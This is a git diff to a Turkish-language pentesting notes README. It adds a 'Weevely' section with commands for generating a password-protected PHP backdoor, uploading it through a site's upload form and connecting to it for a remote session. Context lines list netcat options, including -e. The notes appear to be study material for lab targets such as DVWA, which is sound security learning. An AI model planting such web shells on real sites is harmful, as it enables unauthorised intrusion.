@@ -84,6 +84,8 @@
   - [Subbrute](#Subbrute)
 - [20-Web Pentesting](#20-Web-Pentesting)
   - [DVWA](#DVWA)
+  - [NATCAT ile Dinleme](#NATCAT-ile-Dinleme)
+  - [Weevely](#Weevely)
   - 
 # 1-VPN DNS MAC 
 
@@ -772,3 +774,14 @@ Shodan Bilgi Toplama ve Arama Motoru'dur
 -e: Dosya Aktarımında Kullanılır
 -v: Detay Verir
 ```  
+
+### Weevely
+
+1. ```.php``` kullanarak backdoor trojan oluşturmamızı sağlar
+2. ```weevely generate 11111 /root/myconnection.pnp``` şifremizi ve trojan'in kaydedileceği konumu yazıyoruz
+3. Sitemizin upload yapabileceğimiz kısımını açıyoruz
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/2ac777e091178628c515e1eb99546fe3aa5ed7d8/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2018.51.59.jpeg)
+
+4. Oluşturduğumuz php dosyasını upload ediyoruz
+5. ```weevely http://<IP>/../../uploads/myconneciton.php 11111``` yazarak session içine gireriz ve gezinebiliriz
